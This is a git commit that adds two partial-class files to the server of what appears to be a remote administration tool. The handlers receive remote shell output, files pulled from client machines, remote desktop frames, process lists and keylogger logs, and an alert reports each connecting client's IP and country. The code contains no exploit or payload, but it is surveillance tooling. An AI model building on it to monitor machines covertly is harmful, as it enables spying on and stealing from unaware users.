ac93887af356d0ea0371a1741ba4634ad852b7f3
yankejustin <yankejustin@hotmail.com>
2015-05-15 21:15:44 -0400

    Separated the CommandHandler
    Divided the server's CommandHandler class into partial classes.

---
+++ Server/Core/Commands/MiscHandler.cs
@@ -0,0 +1,131 @@
+﻿using System;
+using System.IO;
+using System.Windows.Forms;
+using xServer.Core.Helper;
+using xServer.Core.Packets.ClientPackets;
+using xServer.Forms;
+
+namespace xServer.Core.Commands
+{
+    /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
+    public static partial class CommandHandler
+    {
+        public static void HandleShellCommandResponse(Client client, ShellCommandResponse packet)
+        {
+            if (client.Value.FrmRs == null)
+                return;
+
+            try
+            {
+                client.Value.FrmRs.Invoke(
+                    (MethodInvoker)delegate { client.Value.FrmRs.txtConsoleOutput.Text += packet.Output; });
+            }
+            catch
+            {
+            }
+        }
+
+        public static void HandleDownloadFileResponse(Client client, DownloadFileResponse packet)
+        {
+            string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + client.EndPoint.Address.ToString());
+            if (!Directory.Exists(downloadPath))
+                Directory.CreateDirectory(downloadPath);
+
+            downloadPath = Path.Combine(downloadPath, packet.Filename);
+
+            bool Continue = true;
+            if (packet.CurrentBlock == 0 && File.Exists(downloadPath))
+                if (
+                    MessageBox.Show(string.Format("The file '{0}' already exists!\nOverwrite it?", packet.Filename),
+                        "Overwrite Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != DialogResult.Yes)
+                    Continue = false;
+
+            if (client.Value.FrmFm == null)
+            {
+                new Packets.ServerPackets.DownloadFileCanceled(packet.ID).Execute(client);
+                MessageBox.Show("Please keep the File Manager open.\n\nWarning: Download aborted", "Download aborted",
+                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+
+            int index = 0;
+            try
+            {
+                client.Value.FrmFm.Invoke((MethodInvoker)delegate
+                {
+                    foreach (ListViewItem lvi in client.Value.FrmFm.lstTransfers.Items)
+                    {
+                        if (packet.ID.ToString() == lvi.SubItems[0].Text)
+                        {
+                            index = lvi.Index;
+                            break;
+                        }
+                    }
+                });
+            }
+            catch
+            {
+                return;
+            }
+
+            if (Continue)
+            {
+                if (!string.IsNullOrEmpty(packet.CustomMessage))
+                {
+                    client.Value.FrmFm.Invoke((MethodInvoker)delegate
+                    {
+                        client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = packet.CustomMessage;
+                        client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 0;
+                    });
+                    return;
+                }
+
+                FileSplit destFile = new FileSplit(downloadPath);
+                if (!destFile.AppendBlock(packet.Block, packet.CurrentBlock))
+                {
+                    client.Value.FrmFm.Invoke((MethodInvoker)delegate
+                    {
+                        client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = destFile.LastError;
+                        client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 0;
+                    });
+                    return;
+                }
+
+                decimal progress =
+                    Math.Round((decimal)((double)(packet.CurrentBlock + 1) / (double)packet.MaxBlocks * 100.0), 2);
+
+                client.Value.FrmFm.Invoke(
+                    (MethodInvoker)
+                        delegate
+                        {
+                            client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text =
+                                string.Format("Downloading...({0}%)", progress);
+                        });
+
+                if ((packet.CurrentBlock + 1) == packet.MaxBlocks)
+                {
+                    client.Value.FrmFm.Invoke((MethodInvoker)delegate
+                    {
+                        client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = "Completed";
+                        client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 1;
+                    });
+                }
+            }
+            else
+            {
+                client.Value.FrmFm.Invoke((MethodInvoker)delegate
+                {
+                    client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = "Canceled";
+                    client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 0;
+                });
+            }
+        }
+
+        private static void ShowPopup(Client c)
+        {
+            FrmMain.Instance.nIcon.ShowBalloonTip(30, string.Format("Client connected from {0}!", c.Value.Country),
+                string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
+                    c.Value.OperatingSystem), ToolTipIcon.Info);
+        }
+    }
+}
---
+++ Server/Core/Commands/SurveillanceHandler.cs
@@ -0,0 +1,197 @@
+﻿using System.Drawing;
+using System.IO;
+using System.Threading;
+using System.Windows.Forms;
+using xServer.Core.Helper;
+using xServer.Core.Packets.ClientPackets;
+
+namespace xServer.Core.Commands
+{
+    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT ARE USED FOR SURVEILLANCE. */
+    public static partial class CommandHandler
+    {
+        public static void HandleRemoteDesktopResponse(Client client, DesktopResponse packet)
+        {
+            if (client.Value.FrmRdp == null)
+                return;
+
+            if (packet.Image == null)
+            {
+                try
+                {
+                    client.Value.FrmRdp.Invoke(
+                        (MethodInvoker)delegate { client.Value.FrmRdp.picDesktop.Image = client.Value.LastDesktop; });
+                }
+                catch
+                {
+                }
+
+                client.Value.LastDesktop = null;
+                client.Value.LastDesktopSeen = true;
+
+                return;
+            }
+
+            // we can not dispose all bitmaps here, cause they are later used again in `client.Value.LastDesktop`
+            if (client.Value.LastDesktop == null)
+            {
+                client.Value.StreamCodec = new UnsafeStreamCodec();
+                if (client.Value.LastQuality != packet.Quality || client.Value.LastMonitor != packet.Monitor)
+                {
+                    client.Value.LastQuality = packet.Quality;
+                    client.Value.LastMonitor = packet.Monitor;
+                }
+
+                using (MemoryStream ms = new MemoryStream(packet.Image))
+                {
+                    Bitmap newScreen = client.Value.StreamCodec.DecodeData(ms);
+
+                    client.Value.LastDesktop = newScreen;
+
+                    try
+                    {
+                        client.Value.FrmRdp.Invoke(
+                            (MethodInvoker)
+                                delegate { client.Value.FrmRdp.picDesktop.Image = (Bitmap)newScreen.Clone(); });
+                    }
+                    catch
+                    {
+                    }
+
+                    newScreen = null;
+                }
+            }
+            else
+            {
+                using (MemoryStream ms = new MemoryStream(packet.Image))
+                {
+                    lock (client.Value.StreamCodec)
+                    {
+                        if (client.Value.LastQuality != packet.Quality || client.Value.LastMonitor != packet.Monitor)
+                        {
+                            client.Value.StreamCodec = new UnsafeStreamCodec();
+                            client.Value.LastQuality = packet.Quality;
+                            client.Value.LastMonitor = packet.Monitor;
+                        }
+
+                        Bitmap newScreen = client.Value.StreamCodec.DecodeData(ms);
+
+                        client.Value.LastDesktop = newScreen;
+
+                        try
+                        {
+                            client.Value.FrmRdp.Invoke(
+                                (MethodInvoker)
+                                    delegate { client.Value.FrmRdp.picDesktop.Image = (Bitmap)newScreen.Clone(); });
+                        }
+                        catch
+                        {
+                        }
+
+                        newScreen = null;
+                    }
+                }
+            }
+
+            packet.Image = null;
+            client.Value.LastDesktopSeen = true;
+        }
+
+        public static void HandleGetProcessesResponse(Client client, GetProcessesResponse packet)
+        {
+            if (client.Value.FrmTm == null)
+                return;
+
+            client.Value.FrmTm.Invoke((MethodInvoker)delegate { client.Value.FrmTm.lstTasks.Items.Clear(); });
+
+            new Thread(() =>
+            {
+                for (int i = 0; i < packet.Processes.Length; i++)
+                {
+                    if (packet.IDs[i] != 0 && packet.Processes[i] != "System.exe")
+                    {
+                        ListViewItem lvi =
+                            new ListViewItem(new string[] { packet.Processes[i], packet.IDs[i].ToString(), packet.Titles[i] });
+                        try
+                        {
+                            client.Value.FrmTm.Invoke(
+                                (MethodInvoker)delegate { client.Value.FrmTm.lstTasks.Items.Add(lvi); });
+                        }
+                        catch
+                        {
+                            break;
+                        }
+                    }
+                }
+            }).Start();
+        }
+
+        public static void HandleGetLogsResponse(Client client, GetLogsResponse packet)
+        {
+            if (client.Value.FrmKl == null)
+                return;
+
+            if (packet.FileCount == 0)
+            {
+                client.Value.FrmKl.Invoke((MethodInvoker)delegate
+                {
+                    client.Value.FrmKl.btnGetLogs.Enabled = true;
+                });
+
+                return;
+            }
+
+            string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + client.EndPoint.Address.ToString() + "\\Logs\\");
+
+            if (!Directory.Exists(downloadPath))
+                Directory.CreateDirectory(downloadPath);
+
+            downloadPath = Path.Combine(downloadPath, packet.Filename + ".html");
+
+            FileSplit destFile = new FileSplit(downloadPath);
+
+            destFile.AppendBlock(packet.Block, packet.CurrentBlock);
+
+            if (packet.Index == packet.FileCount && (packet.CurrentBlock + 1) == packet.MaxBlocks)
+            {
+                FileInfo[] iFiles = new DirectoryInfo(Path.Combine(Application.StartupPath, "Clients\\" + client.EndPoint.Address.ToString() + "\\Logs\\")).GetFiles();
+
+                if (iFiles.Length == 0)
+                    return;
+
+                foreach (FileInfo file in iFiles)
+                {
+                    var file1 = file;
+                    client.Value.FrmKl.Invoke((MethodInvoker)delegate
+                    {
+                        client.Value.FrmKl.lstLogs.Items.Add(new ListViewItem() { Text = file1.Name });
+                    });
+                }
+
+                client.Value.FrmKl.Invoke((MethodInvoker)delegate
+                {
+                    client.Value.FrmKl.btnGetLogs.Enabled = true;
+                });
+            }
+        }
+
+        public static void HandleMonitorsResponse(Client client, MonitorsResponse packet)
+        {
+            if (client.Value.FrmRdp == null)
+                return;
+
+            try
+            {
+                client.Value.FrmRdp.Invoke((MethodInvoker)delegate
+                {
+                    for (int i = 0; i < packet.Number; i++)
+                        client.Value.FrmRdp.cbMonitors.Items.Add(string.Format("Monitor {0}", i + 1));
+                    client.Value.FrmRdp.cbMonitors.SelectedIndex = 0;
+                });
+            }
+            catch
+            {
+            }
+        }
+    }
+}
